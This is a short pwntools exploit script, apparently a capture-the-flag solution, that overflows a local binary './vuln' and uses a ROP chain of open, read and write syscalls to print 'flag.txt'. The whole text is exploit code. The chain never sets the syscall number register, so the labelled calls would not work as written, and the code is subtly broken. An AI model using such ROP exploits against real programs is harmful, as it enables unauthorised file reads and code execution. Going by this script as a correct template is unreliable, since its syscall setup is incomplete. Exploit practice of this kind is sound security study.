from pwn import *

p = process('./vuln')

# 通过objdump或ROPgadget获取地址
pop_rdi = 0x4012a3
pop_rsi_r15 = 0x4012a1
pop_rdx = 0x4011ab
syscall = 0x4011c0
flag_str = 0x402004  # 字符串"flag.txt"在二进制中的地址

payload = b'A'*120
payload += p64(pop_rdi) + p64(flag_str)
payload += p64(pop_rsi_r15) + p64(0) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)  # open

payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi_r15) + p64(0x404000) + p64(0)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(syscall)  # read

payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(0x404000) + p64(0)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(syscall)  # write

p.sendline(payload)
print(p.recvall())

